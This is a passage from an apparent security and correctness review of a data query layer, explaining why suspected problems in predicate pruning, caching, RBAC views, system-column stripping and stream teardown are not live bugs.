schema-qualified names; subqueries in the SELECT list; `HAVING`; casts on the column side. **0
mismatches.** The occurrence-union contract in `prune_files_by_predicates` and the
`any(not occ ...)` back-off in `sql_parser.get_predicate_constraints` are genuinely
conservative. The date/timestamp widening (`_widen_naive_timestamp_bounds`,
`_floor_text_lower_bound_to_day`) holds for both naive and tz-aware columns and for bare-string
vs `DATE`/`TIMESTAMP`-cast literals.

**Correlated-subquery column misattribution.** `get_predicate_constraints` attributes an
unqualified column in a single-source subquery scope to that scope's table even when it is an
outer reference. I convinced myself this cannot be unsound: if the inner table *has* the column,
SQL binds it there too (so the attribution is correct); if it does not, the stats carry no row
for that column, `cols.get(col)` returns `None`, and `_occurrence_excludes_file` cannot exclude.

**Column-name case mismatch in pruning.** `polars.col("column_name").is_in(constrained_cols)` is
case-sensitive, so `WHERE ID = 5` against a column named `id` finds no stats rows — which
retains the file. Fail-open, correct direction.

**Deletion-vector and stats caches across snapshot versions.** Both key on immutable versioned
paths (`_PathKeyedFrameCache` requires an *exact* path match, `TombstoneCache` hashes the
tombstone key), and the reflection view name includes `simple_version`. I could not construct a
stale hit. `TombstoneCache` ref-counting survives a self-join (acquire/release are balanced per
alias).

**Per-query state on shared objects.** `SparkThriftExecutor` holds only configuration on
`self`; every mutable piece of query state is a local. `DuckDBEngine`'s expensive state is
correctly thread-local. `Reflection.rbac_views` / `tombstone_views` use `field(default_factory=dict)`,
not a shared mutable default.

**Reflection view name collision between an open stream and a later query.** The reflection view
name has *no* per-query suffix (unlike the tombstone/RBAC views, which got one precisely for
this hazard), so I expected a held-open stream to be corrupted by a second query issuing
`CREATE OR REPLACE VIEW` + `DROP VIEW` on the same name. It is not: DuckDB's MVCC catalog pins
the running query's definition. Verified — 20,000 rows streamed intact across an interleaved
second query on the same table. The asymmetry is still worth closing on principle, but it is not
a live bug.

**The "query the supertable itself" union path.** `_filter_snapshots` (`data_estimator.py:476-479`)
returns *every* table's snapshots when `super_name == simple_name`, which would have bypassed
both the per-table tombstone lookup and per-table RBAC. It is unreachable through `DataReader`:
`_assert_targets_exist` requires a leaf named `<super>` to exist and returns
`Table not found: <org>/<super>/<super>` first. Worth a comment in `_filter_snapshots` saying so.

**System-column stripping.** `__rowid__`/`__timestamp__` do not leak through `SELECT *`, through
a join, or through the streaming path; `SELECT __rowid__` fails closed; `expose_rowid=True`
adds exactly `__rowid__` and still strips `__timestamp__`, and the ANTI JOIN does not duplicate
the deletion vector's own `__rowid__` into the projection. The NULL-`__rowid__` case is handled
correctly by anti-join semantics (a NULL never matches, so the row is kept).

**RBAC fail-closed-ness.** `create_rbac_view` is not wrapped in a swallow, so a malformed filter
errors the query rather than dropping the filter; `FilterBuilder`'s `_sanitize_column` /
`_sanitize_value` / `_sanitize_operation` reject injection through the structured filter
document. (The way *around* all of this is finding 1, not a hole in this code.)

**`StreamHandle` teardown.** The `_teardown_lock` / `_closed`-inside-the-lock discipline in
`duckdb.py:425-469` genuinely does prevent `cancel()` from reaching a cursor that `close()` is
freeing; `runner.py` creates, iterates and closes every handle on one thread, and only ever
calls the thread-safe `cancel()` across a boundary.
